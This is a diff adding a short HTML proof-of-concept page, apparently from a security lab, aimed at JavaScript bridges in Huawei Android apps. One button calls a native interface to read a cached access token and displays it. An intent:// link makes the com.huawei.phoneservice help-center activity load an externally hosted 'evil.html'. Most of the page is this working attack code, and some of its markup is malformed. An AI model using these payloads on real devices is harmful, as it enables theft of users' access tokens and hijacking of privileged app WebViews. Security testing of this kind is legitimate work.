@@ -1,0 +1,44 @@
+
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+</head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>ICSL Test</title>
+<!--自适应手机分辨率-->
+<meta name='viewport' content='width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no'/>
+<style type="text/css">
+.contain{
+    font-size:60px;
+    }
+
+</style>
+</head>
+
+<script>
+function setStatusBarColor(){
+window.NativeMethod.setStatusBarColor("{"color":"#FF0000"}");
+
+}
+
+function getAT() {
+    //document.write(window.vmallapp.getAccessTokenFromCache());
+    alert(window.fansJSInterface.getAccessTokenFromCache());
+}
+
+function jumpToTopicCreateCommon() {
+    window.MHJsInterface.jumpToTopicCreateCommon();
+    }
+
+</script>
+<body>
+<p><button onclick-"setStatusBarColor()" class="contain">设置状态栏颜色</button></p>
+<p><button onclick="getAT()" class="contain">获取AT</button></p>
+<p><button onclick="jumpToTopicCreateCommon()" class="contain">跳转到普通发帖页</button></p>
+
+    <a href="https://ginove.obs.cn-north-1.myhuaweicloud.com/jenkins/window.html" >window.html</a>
+ 
+ 
+   <a href="intent://xx#Intent;action=com.huawei.phoneservice.action.ENTER_PUSH_MESSAGE;category=android.intent.category.LAUNCHER;launchFlags=0x40000000;package=com.huawei.phoneservice;component=com.huawei.phoneservice/.HelpCenterActivity;S.type_id=3;S.linkeAddress=https://ginove.obs.cn-north-1.myhuaweicloud.com/jenkins/evil.html;end" >tomyhuawei</a>
+</body>
+</html>  
+    
